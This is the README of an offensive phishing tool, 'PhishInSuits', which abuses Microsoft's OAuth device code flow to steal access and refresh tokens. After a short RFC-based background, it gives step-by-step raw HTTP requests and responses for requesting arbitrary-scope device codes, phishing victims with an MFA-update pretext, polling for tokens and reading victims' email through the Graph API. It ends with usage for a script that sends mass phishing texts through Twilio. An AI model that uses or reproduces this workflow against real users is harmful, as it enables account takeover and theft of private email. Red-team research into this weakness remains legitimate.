# PhishInSuits: OAuth Device Code Phishing with Verified Apps

The OAuth Device Authorization flow is documented via:
* [Device Authorization Flow via Auth0](https://auth0.com/docs/flows/device-authorization-flow)
* [v2 OAuth2 Device Code via Microsoft](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)

## Vulnerability

While OAuth Device Authorization ([RFC 8628](https://tools.ietf.org/html/rfc8628)) is not inherently malicious, some implementations of it are lacking recommended configurations that aid in preventing phishing campaigns from leveraging their OAuth Device Authorization servers. The lacking configuration referes to [RFC 8268 Section 5.4](https://tools.ietf.org/html/rfc8628#section-5.4), which details remote phishing via OAuth Device Authorization. The RFC recommends that implementations provide the authorizing devices information to the user and allow the user to confirm they are in posession of the device.

Snippet from RFC 8628 Section 5.4:
```
   It is possible for the device flow to be initiated on a device in an
   attacker's possession.  For example, an attacker might send an email
   instructing the target user to visit the verification URL and enter
   the user code.  To mitigate such an attack, it is RECOMMENDED to
   inform the user that they are authorizing a device during the user-
   interaction step (see Section 3.3) and to confirm that the device is
   in their possession.  The authorization server SHOULD display
   information about the device so that the user could notice if a
   software client was attempting to impersonate a hardware device.
```

Without this implementation, attackers can request a user to navigate to the verification URL and enter a user code without any indications of a malicious device authorization which would result in the attacker obtaining both an access token and a refresh token.

In addition, poor implementations regarding the scope of the returned access token can result in an attacker requesting arbitrary access during a phishing campaign. According to [RFC 6749 Section 3.3](https://tools.ietf.org/html/rfc6749#section-3.3), it is up to the authorization server to accept or ignore a scope provided by the client.

Snippet from RFC 6749 Section 3.3:
```
   The authorization server MAY fully or partially ignore the scope
   requested by the client, based on the authorization server policy or
   the resource owner's instructions.  If the issued access token scope
   is different from the one requested by the client, the authorization
   server MUST include the "scope" response parameter to inform the
   client of the actual scope granted.
```

## OAuth Device Authorization Process

> For this demonstration, the attack is performed against Microsoft's OAuth Device Authorization flow

### Step 1: Requesting the Device Code

Using the client ID for the target public OAuth application, send a request to the following endpoint: `login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode` (where tenant is `organizations` for the use-case of a work email). The server will repond with a JSON object that contains a device code and an associated user code.

#### Request
The request consists of two HTTP POST parameters:
* `client_id`: The client ID of the target public OAuth application.
* `scope`: Space-delimited list of permissions to reuqest when the user is authorizing the application.

> Based on research, it does not appear that the scope provided by the client is restricted to what the application originally specified. As a result, an arbitrary scope can be provided.

```
POST /organizations/oauth2/v2.0/devicecode HTTP/1.1
Host: login.microsoftonline.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
DNT: 1
Upgrade-Insecure-Requests: 1
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 151

client_id=<client_id>&scope=user.read%20analytics.read%20offline_access%20openid%20profile%20email%20Mail.Read%20Contacts.Read
```

#### Response
Microsoft returns a JSON object with several value's in it, but user_code and device_code are the two most important values:
* `user_code`: Nine character alphanumeric value that the user will enter during device login.
* `device_code`: Session identifier that is used by Microsoft to track user authentication and allow for the retrieval of the access and refresh tokens.
* *verification_uri*: The URL that the user will submit the user_code for authentication.
* *expires_in*: Time, in seconds, before the device code expires.
* *interval*: Time, in seconds, in between each poll to check if the user has authenticated.
* *message*: General message to provide to the user with the authentication URL and user code.

```
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
P3P: CP="DSP CUR OTPi IND OTRi ONL FIN"
x-ms-request-id: 2b01a7ca-539b-4cc8-bd51-075fc505db00
x-ms-ests-server: 2.1.11169.11 - CHI ProdSlices
Set-Cookie: fpc=[REDACTED]; expires=Thu, 26-Nov-2020 19:50:28 GMT; path=/; secure; HttpOnly; SameSite=None
Set-Cookie: esctx=[REDACTED]; domain=.login.microsoftonline.com; path=/; secure; HttpOnly; SameSite=None
Set-Cookie: x-ms-gateway-slice=prod; path=/; secure; samesite=none; httponly
Set-Cookie: stsservicecookie=ests; path=/; secure; samesite=none; httponly
Referrer-Policy: strict-origin-when-cross-origin
Date: Tue, 27 Oct 2020 19:50:28 GMT
Connection: close
Content-Length: 473

{
    "user_code":"E2XZV7VLV",
    "device_code":"[REDACTED]",
    "verification_uri":"https://microsoft.com/devicelogin",
    "expires_in":900,
    "interval":5,
    "message":"To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code E2XZV7VLV to authenticate."
}
```

### Step 2: Phishing the User

Using the data returned by Microsoft in [Step 1](#step-1-requesting-the-device-code), send a text/email to the user requesting them to navigate to `https://microsoft.com/devicelogin` and enter the user code value.

This is also noted in the `message` value in the response from Step 1:

```
To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code E2XZV7VLV to authenticate.
```

### Step 3: Polling Microsoft for User Authentication

Based on the `interval` value returned by Microsoft in [Step 1](#step-1-requesting-the-device-code), poll `login.microsoftonline.com/<tenant>/oauth2/v2.0/token` to identify if the user has authenticated yet (where tenant is `organizations` for the use-case of a work email).

#### Request
The request consists of three HTTP POST parameters:
* `client_id`: The client ID of the target public OAuth application.
* `code`: The device code retrieved from Microsoft during Step 1.
* `grant_type`: This is a static value - `urn:ietf:params:oauth:grant-type:device_code`.

```
POST /organizations/oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
DNT: 1
Upgrade-Insecure-Requests: 1
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 325

grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Adevice_code&code=[REDACTED]&client_id=<client_id>
```

#### Response
Normally, polling the `/token` endpoint will return the following error:

```
AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.
```

Which is to be expected and requires a continuation of polling via the `interval` time. Once the user has authenticated and approved the application, the `/token` response will return the user's access and refresh tokens:

```
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
P3P: CP="DSP CUR OTPi IND OTRi ONL FIN"
x-ms-request-id: 3b5ca330-ebca-4c6d-894d-079be18df000
x-ms-ests-server: 2.1.11169.11 - CHI ProdSlices
Set-Cookie: fpc=[REDACTED]; expires=Thu, 26-Nov-2020 19:51:13 GMT; path=/; secure; HttpOnly; SameSite=None
Set-Cookie: x-ms-gateway-slice=prod; path=/; secure; samesite=none; httponly
Set-Cookie: stsservicecookie=ests; path=/; secure; samesite=none; httponly
Referrer-Policy: strict-origin-when-cross-origin
Date: Tue, 27 Oct 2020 19:51:13 GMT
Connection: close
Content-Length: 4864

{
    "token_type":"Bearer",
    "scope":"Analytics.Read Contacts.Read email Mail.Read openid profile User.Read",
    "expires_in":3599,
    "ext_expires_in":3599,
    "access_token":"[REDACTED]",
    "refresh_token":"[REDACTED]",
    "id_token":"[REDACTED]"
}
```

> All tokens have been truncated

The access token returned provides the following details:

```
{
    "aud": "00000003-0000-0000-c000-000000000000",
    "iss": "https://sts.windows.net/[REDACTED]",
    "iat": 1603827973,
    "nbf": 1603827973,
    "exp": 1603831873,
    "acct": 0,
    "acr": "1",
    "aio": "[REDACTED]",
    "amr": [
        "pwd",
        "mfa"
    ],
    "app_displayname": "Apple Internet Accounts",
    "appid": "<client_id>",
    "appidacr": "0",
    "family_name": "Jenkins",
    "given_name": "Carl",
    "idtyp": "user",
    "ipaddr": "[REDACTED]",
    "name": "Carl Jenkins",
    "oid": "[REDACTED]",
    "platf": "5",
    "puid": "[REDACTED]",
    "rh": "[REDACTED]",
    "scp": "Analytics.Read Contacts.Read email Mail.Read openid profile User.Read",
    "signin_state": [
        "kmsi"
    ],
    "sub": "[REDACTED]",
    "tenant_region_scope": "NA",
    "tid": "[REDACTED]",
    "unique_name": "carl.jenkins@M365xxxxxx.onmicrosoft.com",
    "upn": "carl.jenkins@M365xxxxxx.onmicrosoft.com",
    "uti": "[REDACTED]",
    "ver": "1.0",
    "wids": [
        "[REDACTED]"
    ],
    "xms_st": {
        "sub": "[REDACTED]"
    },
    "xms_tcdt": 1583956644
}
```

### Step 4: Graph API Access

Once we have obtained the user's access token, we can leverage it to access data via the Azure Graph API by setting the token as the `Authorization: Bearer` header.

#### Request
Requesting a user's emails via the Graph API:

```
GET /v1.0/users/carl.jenkins@M365xxxxxx.onmicrosoft.com/messages HTTP/1.1
Host: graph.microsoft.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
DNT: 1
Upgrade-Insecure-Requests: 1
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Authorization: Bearer [REDACTED]
```

> Access token has been truncated

#### Response
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/json;odata.metadata=minimal;odata.streaming=true;IEEE754Compatible=false;charset=utf-8
Vary: Accept-Encoding
request-id: ba02169a-7dea-48ff-b509-800e0502c253
client-request-id: ba02169a-7dea-48ff-b509-800e0502c253
x-ms-ags-diagnostic: {"ServerInfo":{"DataCenter":"North Central US","Slice":"SliceC","Ring":"3","ScaleUnit":"003","RoleInstance":"AGSFE_IN_31"}}
OData-Version: 4.0
Strict-Transport-Security: max-age=31536000
Date: Tue, 27 Oct 2020 19:51:13 GMT
Connection: close
Content-Length: 83307

{
    "@odata.context":"https://graph.microsoft.com/v1.0/$metadata#users('carl.jenkins%40M365xxxxxx.onmicrosoft.com')/messages",
    "value":[
        {
            "@odata.etag":"[REDACTED]"",
            "id":"AAMkADhhMz...

... SNIPPED ...

}
```

## Tooling

The included Python script automates this process, currently using Twilio to send phishing text messages. When the access token is retrieved - it, along with the refresh token, is written to a local file: `<email>.token.json`. When email's are retrieved from the Graph API, they are also written locally to: `<email>.messages.json`.

> Note: The included pretext for texting/emailing relates to updating a users MFA.

### Usage

```
usage: pis.py [-h] [-e TGT_EMAIL] [-p TGT_PHONE] [-f TGT_FILE] [-P FROM_PHONE]
              [-s TWL_SID] [-k TWL_TOKEN] [-c CLIENT_ID] [-S SCOPE] [-G] [-A API]
              [--proxy PROXY] [--threads THREADS] [--debug]

PhishInSuits: OAuth Device Code Phishing with Verified Apps - v1.0.0

optional arguments:
  -h, --help            show this help message and exit

  -e TGT_EMAIL, --tgt_email TGT_EMAIL
                        Target victim email address

  -p TGT_PHONE, --tgt_phone TGT_PHONE
                        Target victim phone number (Optional)

  -f TGT_FILE, --tgt_file TGT_FILE
                        File containing target email addresses and phone numbers (Optional).
                        One target per line.
                        Comma delimited -> email,phone

  -P FROM_PHONE, --from_phone FROM_PHONE
                        Phone number to send texts from via Twilio

  -s TWL_SID, --twl_sid TWL_SID
                        Twilio SID

  -k TWL_TOKEN, --twl_token TWL_TOKEN
                        Twilio Token

  -c CLIENT_ID, --client_id CLIENT_ID
                        Client ID for the target application

  -S SCOPE, --scope SCOPE
                        Comma delimited list of permissions to request.
                        Default: user.read offline_access openid profile email Mail.Read Contacts.Read

  -G, --get-data        After authentication, collect data from Azure Graph API

  -A API, --api API     List of API endpoints to call.
                        User profile will always be included.
                        Comma delimited list

  --proxy PROXY         Proxy to pass traffic through (e.g. http://127.0.0.1:8080)

  --threads THREADS     Number of threads for multi-target runs (Default=20)

  --debug               Enable debugging output
```

#### Example

```
$ python3 pis.py -e user@example.com -p '<victim_phone>' -P '<from_phone>' \
                 -s '<twilio_sid>' -t '<twilio_token>' -c '<client_id>' --get-data

[INFO] [user@example.com] Code successfully retrieved.
[INFO] [user@example.com] Message: To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code E2XZV7VLV to authenticate.
[INFO] [user@example.com] Text message successfully sent.
[INFO] [user@example.com] Polling for user authentication...
[INFO] [user@example.com] Polling for user authentication...
[INFO] [user@example.com] Polling for user authentication...
[INFO] [user@example.com] Polling for user authentication...
[INFO] [user@example.com] Polling for user authentication...
[INFO] [user@example.com] Token info saved to user@example.com.tokeninfo.json
[INFO] [user@example.com] Azure Graph API results for 'profile' saved to user@example.com.profile.json
```
